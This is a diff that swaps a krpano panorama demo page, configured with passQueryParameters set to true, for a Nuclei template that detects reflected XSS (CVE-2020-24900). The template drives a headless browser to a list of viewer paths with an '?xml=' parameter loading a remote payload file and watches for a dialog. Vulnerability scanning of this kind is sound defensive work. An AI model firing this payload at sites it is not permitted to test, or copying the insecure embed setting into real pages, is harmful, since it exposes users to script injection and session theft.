@@ -1,34 +1,81 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>krpano Single Panorama Test</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, viewport-fit=cover" />
-    <meta name="apple-mobile-web-app-capable" content="yes" />
-    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
-    
-    <style>
-        html, body { height:100%; width:100%; margin:0; padding:0; overflow:hidden; }
-        #pano { width:100%; height:100%; }
-    </style>
-</head>
-<body>
+id: CVE-2020-24900
 
-    <!-- The container where the panorama will be loaded -->
-    <div id="pano"></div>
+info:
+  name: Krpano Panorama Viewer <= 1.20.8 - Cross-Site Scripting
+  author: s4e-io
+  severity: medium
+  description: |
+    The default installation of Krpano Panorama Viewer version 1.20.8 and before is prone to reflected cross-site scripting via the xml parameter in krpano.html. When passQueryParameters allows the xml parameter, a remote XML file supplied in the URL is loaded and its embedded Javascript action is executed in the origin of the viewer.
+  impact: |
+    An attacker can execute arbitrary Javascript in the victim's browser in the context of the vulnerable site by sending a crafted link, which can lead to session theft or actions performed on behalf of the victim.
+  remediation: |
+    Update to the latest Krpano version and set passQueryParameters to a fixed list of parameters that does not include xml, instead of true.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2020-24900
+    - https://krpano.com/docu/releasenotes/?version=12010
+    - https://krpano.com/docu/embedpano/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cve-id: CVE-2020-24900
+    epss-score: 0.01231
+    epss-percentile: 0.69141
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: krpano
+    product: panorama_viewer
+    shodan-query: http.html:"embedpano"
+  tags: cve,cve2020,krpano,xss,headless,viewer
 
-    <!-- Load the krpano library -->
-    <script src="krpano.js"></script>
+variables:
+  payload: "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/helpers/payloads/CVE-2020-24900.xml"
 
-    <script>
-        // Embed the panorama viewer
-        embedpano({
-            xml: "tour.xml",       // Path to your config file
-            target: "pano",        // ID of the target div
-            html5: "auto",         // Use HTML5 rendering
-            mobilescale: 1.0,
-            passQueryParameters: true
-        });
-    </script>
+flow: (http(1) || http(2)) && headless(1)
 
-</body>
-</html>
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "embedpano(")'
+          - 'contains(body, "passQueryParameters")'
+        condition: and
+        internal: true
+
+headless:
+  - payloads:
+      path:
+        - "/"
+        - "/index.html"
+        - "/tour.html"
+        - "/krpano.html"
+        - "/vtour/index.html"
+        - "/vtour/tour.html"
+
+    attack: batteringram
+
+    steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}{{path}}?xml={{payload}}"
+      - action: waitdialog
+        name: krpano_xss
+
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'krpano_xss == true'
+
+    extractors:
+      - type: dsl
+        dsl:
+          - 'BaseURL + path + "?xml=" + payload'
+# digest: 490a0046304402201dbf917cffbe904a21c5c3675fd459b589fb3e2f99000f76bb077779e81f47450220340201c8c892c75270229e68489a150d4f3b57c5c8eb7346c28d29474de26a7b:922c64590222798bb761d5b6d8e72950
